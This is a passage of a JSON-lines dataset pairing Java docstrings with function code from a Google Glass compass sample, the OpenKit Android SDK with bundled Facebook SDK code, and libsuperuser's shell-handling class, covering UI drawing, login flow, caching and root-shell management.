getContext().getResources().getString(\n                    R.string.place_text_format, name, mDistanceFormat.format(distanceKm));\n\n                // Measure the text and offset the text bounds to the location where the text\n                // will finally be drawn.\n                Rect textBounds = new Rect();\n                mPlacePaint.getTextBounds(text, 0, text.length(), textBounds);\n                textBounds.offsetTo((int) (offset + bearing * pixelsPerDegree\n                        + PLACE_PIN_WIDTH / 2 + PLACE_TEXT_MARGIN), canvas.getHeight() / 2\n                        - (int) PLACE_TEXT_HEIGHT);\n\n                // Extend the bounds rectangle to include the pin icon and a small margin\n                // to the right of the text, for the overlap calculations below.\n                textBounds.left -= PLACE_PIN_WIDTH + PLACE_TEXT_MARGIN;\n                textBounds.right += PLACE_TEXT_MARGIN;\n\n                // This loop attempts to find the best vertical position for the string by\n                // starting at the bottom of the display and checking to see if it overlaps\n                // with any other labels that were already drawn. If there is an overlap, we\n                // move up and check again, repeating this process until we find a vertical\n                // position where there is no overlap, or when we reach the limit on\n                // overlapping place names.\n                boolean intersects;\n                int numberOfTries = 0;\n                do {\n                    intersects = false;\n                    numberOfTries++;\n                    textBounds.offset(0, (int) -(PLACE_TEXT_HEIGHT + PLACE_TEXT_LEADING));\n\n                    for (Rect existing : mAllBounds) {\n                        if (Rect.intersects(existing, textBounds)) {\n                            intersects = true;\n                            break;\n                        }\n                    }\n                } while (intersects && numberOfTries <= MAX_OVERLAPPING_PLACE_NAMES);\n\n                // Only draw the string if it would not go high enough to overlap the compass\n                // directions. This means some places may not be drawn, even if they're nearby.\n                if (numberOfTries <= MAX_OVERLAPPING_PLACE_NAMES) {\n                    mAllBounds.add(textBounds);\n\n                    canvas.drawBitmap(mPlaceBitmap, offset + bearing * pixelsPerDegree\n                            - PLACE_PIN_WIDTH / 2, textBounds.top + 2, mPaint);\n                    canvas.drawText(text,\n                            offset + bearing * pixelsPerDegree + PLACE_PIN_WIDTH / 2\n                            + PLACE_TEXT_MARGIN, textBounds.top + PLACE_TEXT_HEIGHT,\n                            mPlacePaint);\n                }\n            }\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassView.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Populates the internal places list from places found in a JSON string. This string should\n * contain a root object with a \"landmarks\" property that is an array of objects that represent\n * places. A place has three properties: name, latitude, and longitude.\n */\n", "func_signal": "private void populatePlaceList(String jsonString)", "code": "{\n    try {\n        JSONObject json = new JSONObject(jsonString);\n        JSONArray array = json.optJSONArray(\"landmarks\");\n\n        if (array != null) {\n            for (int i = 0; i < array.length(); i++) {\n                JSONObject object = array.optJSONObject(i);\n                Place place = jsonObjectToPlace(object);\n                if (place != null) {\n                    mPlaces.add(place);\n                }\n            }\n        }\n    } catch (JSONException e) {\n        Log.e(TAG, \"Could not parse landmarks JSON string\", e);\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\model\\Landmarks.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Draws a needle that is centered at the top or bottom of the compass.\n *\n * @param canvas the {@link Canvas} upon which to draw\n * @param bottom true to draw the bottom needle, or false to draw the top needle\n */\n", "func_signal": "private void drawNeedle(Canvas canvas, boolean bottom)", "code": "{\n    float centerX = getWidth() / 2.0f;\n    float origin;\n    float sign;\n\n    // Flip the vertical coordinates if we're drawing the bottom needle.\n    if (bottom) {\n        origin = getHeight();\n        sign = -1;\n    } else {\n        origin = 0;\n        sign = 1;\n    }\n\n    float needleHalfWidth = NEEDLE_WIDTH / 2;\n\n    mPath.reset();\n    mPath.moveTo(centerX - needleHalfWidth, origin);\n    mPath.lineTo(centerX - needleHalfWidth, origin + sign * (NEEDLE_HEIGHT - 4));\n    mPath.lineTo(centerX, origin + sign * NEEDLE_HEIGHT);\n    mPath.lineTo(centerX + needleHalfWidth, origin + sign * (NEEDLE_HEIGHT - 4));\n    mPath.lineTo(centerX + needleHalfWidth, origin);\n    mPath.close();\n\n    canvas.drawPath(mPath, mPaint);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassView.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Sets the current heading in degrees and redraws the compass. If the angle is not between 0\n * and 360, it is shifted to be in that range.\n *\n * @param degrees the current heading\n */\n", "func_signal": "public void setHeading(float degrees)", "code": "{\n    mHeading = MathUtils.mod(degrees, 360.0f);\n    animateTo(mHeading);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassView.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Gets the text to show in the title bar, if a title bar is to be shown.\n *\n * @return the text to show in the title bar\n */\n", "func_signal": "public String getTitleText()", "code": "{\n    if (titleText == null) {\n        titleText = getDefaultTitleText();\n    }\n    return titleText;\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\PickerFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// If the button is Visible, set it to Invisible (e.g. do not set View.Gone to View.Invisible)\n", "func_signal": "private void setButtonInvisibleIfNotGone(Button button)", "code": "{\n\tif(button.getVisibility() != View.GONE) {\n\t\tbutton.setVisibility(View.INVISIBLE);\n\t}\n}", "path": "OpenKitSDK\\src\\io\\openkit\\OKLoginFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Create the LoginButton by inflating from XML and applying a style.\n *\n * @see View#View(Context, AttributeSet, int)\n */\n", "func_signal": "public LoginButton(Context context, AttributeSet attrs, int defStyle)", "code": "{\n    super(context, attrs, defStyle);\n    parseAttributes(attrs);\n    initializeActiveSessionWithCachedToken(context);\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\LoginButton.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// Opens an output stream for the key, and creates an input stream wrapper to copy\n// the contents of input into the new output stream.  The effect is to store a\n// copy of input, and associate that data with key.\n", "func_signal": "public InputStream interceptAndPut(String key, InputStream input) throws IOException", "code": "{\n    OutputStream output = openPutStream(key);\n    return new CopyingInputStream(input, output);\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\internal\\FileLruCache.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Starts the Facebook authentication process. Performs Facebook authentication using the best method available\n * (native Android dialog, single sign on through Facebook application, or using a web view shown inside the app)\n */\n", "func_signal": "private void loginToFB()", "code": "{\n\tFBLoginRequestHandler loginRequestHandler = new FBLoginRequestHandler() {\n\n\t\t@Override\n\t\tpublic void onFBLoginSucceeded() {\n\t\t\tauthorizeFBUserWithOpenKit();\n\t\t}\n\n\t\t@Override\n\t\tpublic void onFBLoginError(String errorMessage) {\n\t\t\tOKLog.v(\"Fb login failed in the callback\");\n\t\t\thideSpinner();\n\t\t\tif(errorMessage != null) {\n\t\t\t\tFacebookUtilities.showErrorMessage(errorMessage, OKLoginFragment.this.getActivity());\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\tpublic void onFBLoginCancelled() {\n\t\t\tOKLog.v(\"FB Login cancelled\");\n\t\t\thideSpinner();\n\t\t}\n\t};\n\n\tfbLoginRequest.setRequestHandler(loginRequestHandler);\n\tshowSpinner();\n\tfbLoginRequest.loginToFacebook(this);\n}", "path": "OpenKitSDK\\src\\io\\openkit\\OKLoginFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Provides an implementation for {@link Activity#onActivityResult\n * onActivityResult} that updates the Session based on information returned\n * during the authorization flow. The Activity containing this view\n * should forward the resulting onActivityResult call here to\n * update the Session state based on the contents of the resultCode and\n * data.\n *\n * @param requestCode\n *            The requestCode parameter from the forwarded call. When this\n *            onActivityResult occurs as part of Facebook authorization\n *            flow, this value is the activityCode passed to open or\n *            authorize.\n * @param resultCode\n *            An int containing the resultCode parameter from the forwarded\n *            call.\n * @param data\n *            The Intent passed as the data parameter from the forwarded\n *            call.\n * @return A boolean indicating whether the requestCode matched a pending\n *         authorization request for this Session.\n * @see Session#onActivityResult(Activity, int, int, Intent)\n */\n", "func_signal": "public boolean onActivityResult(int requestCode, int resultCode, Intent data)", "code": "{\n    Session session = sessionTracker.getSession();\n    if (session != null) {\n        return session.onActivityResult((Activity)getContext(), requestCode,\n                resultCode, data);\n    } else {\n        return false;\n    }\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\LoginButton.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Create the LoginButton.\n *\n * @see View#View(Context)\n */\n", "func_signal": "public LoginButton(Context context)", "code": "{\n    super(context);\n    initializeActiveSessionWithCachedToken(context);\n    // since onFinishInflate won't be called, we need to finish initialization ourselves\n    finishInit();\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\LoginButton.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Sets the extra fields to request for the retrieved graph objects.\n *\n * @param fields the extra fields to request\n */\n", "func_signal": "public void setExtraFields(Collection<String> fields)", "code": "{\n    extraFields = new HashSet<String>();\n    if (fields != null) {\n        extraFields.addAll(fields);\n    }\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\PickerFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Causes the picker to load data from the service and display it to the user.\n *\n * @param forceReload if true, data will be loaded even if there is already data being displayed (or loading);\n *                    if false, data will not be re-loaded if it is already displayed (or loading)\n */\n", "func_signal": "public void loadData(boolean forceReload)", "code": "{\n    if (!forceReload && loadingStrategy.isDataPresentOrLoading()) {\n        return;\n    }\n    loadDataSkippingRoundTripIfCached();\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\PickerFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Gets the text to show in the Done button, if a title bar is to be shown.\n *\n * @return the text to show in the Done button\n */\n", "func_signal": "public String getDoneButtonText()", "code": "{\n    if (doneButtonText == null) {\n        doneButtonText = getDefaultDoneButtonText();\n    }\n    return doneButtonText;\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\PickerFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/* Below methods are overridden to add the Facebook session and Google auth lifecycle callbacks */\n", "func_signal": "@Override\npublic void onStart()", "code": "{\n\tsuper.onStart();\n\tfbLoginRequest.onStart();\n}", "path": "OpenKitSDK\\src\\io\\openkit\\OKLoginFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// Return a hash of the android_id combined with the appid.  Intended to dedupe requests on the server side\n// in order to do counting of users unknown to Facebook.  Because we put the appid into the key prior to hashing,\n// we cannot do correlation of the same user across multiple apps -- this is intentional.  When we transition to\n// the Google advertising ID, we'll get rid of this and always send that up.\n", "func_signal": "public static String getHashedDeviceAndAppID(Context context, String applicationId)", "code": "{\n    String androidId = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);\n\n    if (androidId == null) {\n        return null;\n    } else {\n        return sha1hash(androidId + applicationId);\n    }\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\internal\\Utility.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// If the button is Invisible, set it it Visible (e.g. do not set View.gone to View.Visible)\n", "func_signal": "private void setButtonVisibleIfNotGone(Button button)", "code": "{\n\tif(button.getVisibility() != View.GONE) {\n\t\tbutton.setVisibility(View.VISIBLE);\n\t}\n}", "path": "OpenKitSDK\\src\\io\\openkit\\OKLoginFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Called after the user is authenticated with Facebook. Uses the the Facebook authentication token to look up\n * the user's facebook id, then gets the corresponding OKUser to this facebook ID.\n */\n", "func_signal": "private void authorizeFBUserWithOpenKit()", "code": "{\n\tFacebookUtilities.CreateOrUpdateOKUserFromFacebook(new CreateOrUpdateOKUserRequestHandler() {\n\n\t\t@Override\n\t\tpublic void onSuccess(OKUser user) {\n\t\t\thideSpinner();\n\t\t\tOKLog.v(\"Got OKUser successfully!\");\n\t\t\tOKManager.INSTANCE.handlerUserLoggedIn(user, OKLoginFragment.this.getActivity());\n\t\t\tdialogDelegate.onLoginSucceeded();\n\t\t}\n\n\t\t@Override\n\t\tpublic void onFail(Throwable error) {\n\t\t\thideSpinner();\n\t\t\tOKLog.v(\"Failed to create OKUSER: \" + error);\n\t\t\tshowLoginErrorMessage(\"Sorry, but there was an error reaching the OpenKit server. Please try again later\");\n\t\t}\n\t});\n}", "path": "OpenKitSDK\\src\\io\\openkit\\OKLoginFragment.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Set the Session object to use instead of the active Session. Since a Session\n * cannot be reused, if the user logs out from this Session, and tries to\n * log in again, a new Active Session will be used instead.\n * <p/>\n * If the passed in session is currently opened, this method will also attempt to\n * load some user information for display (if needed).\n *\n * @param newSession the Session object to use\n * @throws FacebookException if errors occur during the loading of user information\n */\n", "func_signal": "public void setSession(Session newSession)", "code": "{\n    sessionTracker.setSession(newSession);\n    fetchUserInfo();\n    setButtonText();\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\LoginButton.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// Note that this method makes a synchronous Graph API call, so should not be called from the main thread.\n", "func_signal": "public static FetchedAppSettings queryAppSettings(final String applicationId, final boolean forceRequery)", "code": "{\n\n    // Cache the last app checked results.\n    if (!forceRequery && fetchedAppSettings.containsKey(applicationId)) {\n        return fetchedAppSettings.get(applicationId);\n    }\n\n    Bundle appSettingsParams = new Bundle();\n    appSettingsParams.putString(APPLICATION_FIELDS, TextUtils.join(\",\", APP_SETTING_FIELDS));\n\n    Request request = Request.newGraphPathRequest(null, applicationId, null);\n    request.setParameters(appSettingsParams);\n\n    GraphObject supportResponse = request.executeAndWait().getGraphObject();\n    FetchedAppSettings result = new FetchedAppSettings(\n            safeGetBooleanFromResponse(supportResponse, SUPPORTS_ATTRIBUTION),\n            safeGetBooleanFromResponse(supportResponse, SUPPORTS_IMPLICIT_SDK_LOGGING));\n\n    fetchedAppSettings.put(applicationId, result);\n\n    return result;\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\internal\\Utility.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// The value of tag should be a final String that works as a directory name.\n", "func_signal": "public FileLruCache(Context context, String tag, Limits limits)", "code": "{\n    this.tag = tag;\n    this.limits = limits;\n    this.directory = new File(context.getCacheDir(), tag);\n    this.lock = new Object();\n\n    // Ensure the cache dir exists\n    if (this.directory.mkdirs() || this.directory.isDirectory()) {\n        // Remove any stale partially-written files from a previous run\n        BufferFile.deleteAll(this.directory);\n    }\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\internal\\FileLruCache.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// Returns either a JSONObject or JSONArray representation of the 'key' property of 'jsonObject'.\n", "func_signal": "public static Object getStringPropertyAsJSON(JSONObject jsonObject, String key, String nonJSONPropertyKey)\n        throws JSONException", "code": "{\n    Object value = jsonObject.opt(key);\n    if (value != null && value instanceof String) {\n        JSONTokener tokener = new JSONTokener((String) value);\n        value = tokener.nextValue();\n    }\n\n    if (value != null && !(value instanceof JSONObject || value instanceof JSONArray)) {\n        if (nonJSONPropertyKey != null) {\n            // Facebook sometimes gives us back a non-JSON value such as\n            // literal \"true\" or \"false\" as a result.\n            // If we got something like that, we present it to the caller as\n            // a GraphObject with a single\n            // property. We only do this if the caller wants that behavior.\n            jsonObject = new JSONObject();\n            jsonObject.putOpt(nonJSONPropertyKey, value);\n            return jsonObject;\n        } else {\n            throw new FacebookException(\"Got an unexpected non-JSON object.\");\n        }\n    }\n\n    return value;\n\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\internal\\Utility.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * Create the LoginButton by inflating from XML\n *\n * @see View#View(Context, AttributeSet)\n */\n", "func_signal": "public LoginButton(Context context, AttributeSet attrs)", "code": "{\n    super(context, attrs);\n\n    if (attrs.getStyleAttribute() == 0) {\n        // apparently there's no method of setting a default style in xml,\n        // so in case the users do not explicitly specify a style, we need\n        // to use sensible defaults.\n        this.setGravity(Gravity.CENTER);\n        this.setTextColor(getResources().getColor(R.color.com_facebook_loginview_text_color));\n        this.setTextSize(TypedValue.COMPLEX_UNIT_PX,\n                getResources().getDimension(R.dimen.com_facebook_loginview_text_size));\n        this.setTypeface(Typeface.DEFAULT_BOLD);\n        if (isInEditMode()) {\n            // cannot use a drawable in edit mode, so setting the background color instead\n            // of a background resource.\n            this.setBackgroundColor(getResources().getColor(R.color.com_facebook_blue));\n            // hardcoding in edit mode as getResources().getString() doesn't seem to work in IntelliJ\n            loginText = \"Log in with Facebook\";\n        } else {\n            this.setBackgroundResource(R.drawable.com_facebook_button_blue);\n            this.setCompoundDrawablesWithIntrinsicBounds(R.drawable.com_facebook_inverse_icon, 0, 0, 0);\n            this.setCompoundDrawablePadding(\n                    getResources().getDimensionPixelSize(R.dimen.com_facebook_loginview_compound_drawable_padding));\n            this.setPadding(getResources().getDimensionPixelSize(R.dimen.com_facebook_loginview_padding_left),\n                    getResources().getDimensionPixelSize(R.dimen.com_facebook_loginview_padding_top),\n                    getResources().getDimensionPixelSize(R.dimen.com_facebook_loginview_padding_right),\n                    getResources().getDimensionPixelSize(R.dimen.com_facebook_loginview_padding_bottom));\n        }\n    }\n    parseAttributes(attrs);\n    if (!isInEditMode()) {\n        initializeActiveSessionWithCachedToken(context);\n    }        \n}", "path": "Vendor\\facebook\\src\\com\\facebook\\widget\\LoginButton.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "// Returns true iff all items in subset are in superset, treating null and\n// empty collections as\n// the same.\n", "func_signal": "public static <T> boolean isSubset(Collection<T> subset, Collection<T> superset)", "code": "{\n    if ((superset == null) || (superset.size() == 0)) {\n        return ((subset == null) || (subset.size() == 0));\n    }\n\n    HashSet<T> hash = new HashSet<T>(superset);\n    for (T t : subset) {\n        if (!hash.contains(t)) {\n            return false;\n        }\n    }\n    return true;\n}", "path": "Vendor\\facebook\\src\\com\\facebook\\internal\\Utility.java", "repo_name": "OpenKit/openkit-android", "stars": 64, "license": "apache-2.0", "language": "java", "size": 7351}
{"docstring": "/**\n * <p>\n * Clears results cached by isSELinuxEnforcing() and version(boolean\n * internal) calls.\n * </p>\n * <p>\n * Most apps should never need to call this, as neither enforcing status\n * nor su version is likely to change on a running device - though it is\n * not impossible.\n * </p>\n */\n", "func_signal": "public static synchronized void clearCachedResults()", "code": "{\n    isSELinuxEnforcing = null;\n    suVersion[0] = null;\n    suVersion[1] = null;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>\n * Add a command to execute, with a callback to be called on completion\n * </p>\n * <p>\n * The thread on which the callback executes is dependent on various\n * factors, see {@link eu.chainfire.libsuperuser.Shell.Interactive} for further details\n * </p>\n * \n * @param command Command to execute\n * @param code User-defined value passed back to the callback\n * @param onCommandResultListener Callback to be called on completion\n * @return This Builder object for method chaining\n */\n", "func_signal": "public Builder addCommand(String command, int code,\n        OnCommandResultListener onCommandResultListener)", "code": "{\n    return addCommand(new String[] {\n            command\n    }, code, onCommandResultListener);\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>\n * Set a callback called for every line output to STDERR by the shell\n * </p>\n * <p>\n * The thread on which the callback executes is dependent on various\n * factors, see {@link eu.chainfire.libsuperuser.Shell.Interactive} for further details\n * </p>\n * \n * @param onLineListener Callback to be called for each line\n * @return This Builder object for method chaining\n */\n", "func_signal": "public Builder setOnSTDERRLineListener(OnLineListener onLineListener)", "code": "{\n    this.onSTDERRLineListener = onLineListener;\n    return this;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Try to clean up as much as possible from a shell that's gotten itself\n * wedged. Hopefully the StreamGobblers will croak on their own when the\n * other side of the pipe is closed.\n */\n", "func_signal": "public synchronized void kill()", "code": "{\n    running = false;\n    closed = true;\n\n    try {\n        STDIN.close();\n    } catch (IOException e) {\n    }\n    try {\n        process.destroy();\n    } catch (Exception e) {\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * See if the shell is alive, and if so, check the UID\n * \n * @param ret Standard output from running availableTestCommands\n * @param checkForRoot true if we are expecting this shell to be running as\n *            root\n * @return true on success, false on error\n */\n", "func_signal": "protected static boolean parseAvailableResult(List<String> ret, boolean checkForRoot)", "code": "{\n    if (ret == null)\n        return false;\n\n    // this is only one of many ways this can be done\n    boolean echo_seen = false;\n\n    for (String line : ret) {\n        if (line.contains(\"uid=\")) {\n            // id command is working, let's see if we are actually root\n            return !checkForRoot || line.contains(\"uid=0\");\n        } else if (line.contains(\"-BOC-\")) {\n            // if we end up here, at least the su command starts some kind\n            // of shell,\n            // let's hope it has root privileges - no way to know without\n            // additional\n            // native binaries\n            echo_seen = true;\n        }\n    }\n\n    return echo_seen;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Internal call that launches the shell, starts gobbling, and starts\n * executing commands. See {@link eu.chainfire.libsuperuser.Shell.Interactive}\n * \n * @return Opened successfully ?\n */\n", "func_signal": "private synchronized boolean open()", "code": "{\n    Debug.log(String.format(\"[%s%%] START\", shell.toUpperCase(Locale.ENGLISH)));\n\n    try {\n        // setup our process, retrieve STDIN stream, and STDOUT/STDERR\n        // gobblers\n        if (environment.size() == 0) {\n            process = Runtime.getRuntime().exec(shell);\n        } else {\n            Map<String, String> newEnvironment = new HashMap<String, String>();\n            newEnvironment.putAll(System.getenv());\n            newEnvironment.putAll(environment);\n            int i = 0;\n            String[] env = new String[newEnvironment.size()];\n            for (Map.Entry<String, String> entry : newEnvironment.entrySet()) {\n                env[i] = entry.getKey() + \"=\" + entry.getValue();\n                i++;\n            }\n            process = Runtime.getRuntime().exec(shell, env);\n        }\n\n        STDIN = new DataOutputStream(process.getOutputStream());\n        STDOUT = new StreamGobbler(shell.toUpperCase(Locale.ENGLISH) + \"-\",\n                process.getInputStream(), new OnLineListener() {\n                    @Override\n                    public void onLine(String line) {\n                        synchronized (Interactive.this) {\n                            if (command == null) {\n                                return;\n                            }\n                            if (line.startsWith(command.marker)) {\n                                try {\n                                    lastExitCode = Integer.valueOf(\n                                            line.substring(command.marker.length() + 1), 10);\n                                } catch (Exception e) {\n                                }\n                                lastMarkerSTDOUT = command.marker;\n                                processMarker();\n                            } else {\n                                addBuffer(line);\n                                processLine(line, onSTDOUTLineListener);\n                                processLine(line, command.onCommandLineListener);\n                            }\n                        }\n                    }\n                });\n        STDERR = new StreamGobbler(shell.toUpperCase(Locale.ENGLISH) + \"*\",\n                process.getErrorStream(), new OnLineListener() {\n                    @Override\n                    public void onLine(String line) {\n                        synchronized (Interactive.this) {\n                            if (command == null) {\n                                return;\n                            }\n                            if (line.startsWith(command.marker)) {\n                                lastMarkerSTDERR = command.marker;\n                                processMarker();\n                            } else {\n                                if (wantSTDERR)\n                                    addBuffer(line);\n                                processLine(line, onSTDERRLineListener);\n                            }\n                        }\n                    }\n                });\n\n        // start gobbling and write our commands to the shell\n        STDOUT.start();\n        STDERR.start();\n\n        running = true;\n        closed = false;\n\n        runNextCommand();\n\n        return true;\n    } catch (IOException e) {\n        // shell probably not found\n        return false;\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Increase callback counter\n */\n", "func_signal": "private void startCallback()", "code": "{\n    synchronized (callbackSync) {\n        callbacks++;\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Process a normal STDOUT/STDERR line\n * \n * @param line Line to process\n * @param listener Callback to call or null\n */\n", "func_signal": "private synchronized void processLine(String line, OnLineListener listener)", "code": "{\n    if (listener != null) {\n        if (handler != null) {\n            final String fLine = line;\n            final OnLineListener fListener = listener;\n\n            startCallback();\n            handler.post(new Runnable() {\n                @Override\n                public void run() {\n                    try {\n                        fListener.onLine(fLine);\n                    } finally {\n                        endCallback();\n                    }\n                }\n            });\n        } else {\n            listener.onLine(line);\n        }\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Disable the watchdog timer upon command completion\n */\n", "func_signal": "private void stopWatchdog()", "code": "{\n    if (watchdog != null) {\n        watchdog.shutdownNow();\n        watchdog = null;\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>\n * Automatically create a handler if possible ? Default to true\n * </p>\n * <p>\n * See {@link eu.chainfire.libsuperuser.Shell.Interactive} for further details on threading and\n * handlers\n * </p>\n * \n * @param autoHandler Auto-create handler ?\n * @return This Builder object for method chaining\n */\n", "func_signal": "public Builder setAutoHandler(boolean autoHandler)", "code": "{\n    this.autoHandler = autoHandler;\n    return this;\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>\n * Add a command to execute, with a callback. This callback gobbles the\n * output line by line without buffering it and also returns the result\n * code on completion.\n * </p>\n * <p>\n * The thread on which the callback executes is dependent on various\n * factors, see {@link eu.chainfire.libsuperuser.Shell.Interactive} for further details\n * </p>\n * \n * @param command Command to execute\n * @param code User-defined value passed back to the callback\n * @param onCommandLineListener Callback\n */\n", "func_signal": "public void addCommand(String command, int code, OnCommandLineListener onCommandLineListener)", "code": "{\n    addCommand(new String[] {\n            command\n    }, code, onCommandLineListener);\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * Processes a STDOUT/STDERR line containing an end/exitCode marker\n */\n", "func_signal": "private synchronized void processMarker()", "code": "{\n    if (command.marker.equals(lastMarkerSTDOUT)\n            && (command.marker.equals(lastMarkerSTDERR))) {\n        postCallback(command, lastExitCode, buffer);\n        stopWatchdog();\n        command = null;\n        buffer = null;\n        idle = true;\n        runNextCommand();\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Shell.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
{"docstring": "/**\n * <p>Enable or disable logging specific types of message</p>\n * \n * <p>You may | (or) LOG_* constants together. Note that\n * debug mode must also be enabled for actual logging to\n * occur.</p>\n * \n * @param type LOG_* constants\n * @param enable Enable or disable\n */\n", "func_signal": "public static void setLogTypeEnabled(int type, boolean enable)", "code": "{ \n    if (enable) {\n        logTypes |= type;\n    } else {\n        logTypes &= ~type;\n    }\n}", "path": "libsuperuser\\src\\eu\\chainfire\\libsuperuser\\Debug.java", "repo_name": "kyze8439690/DevelopQuickSetting", "stars": 110, "license": "None", "language": "java", "size": 12113}
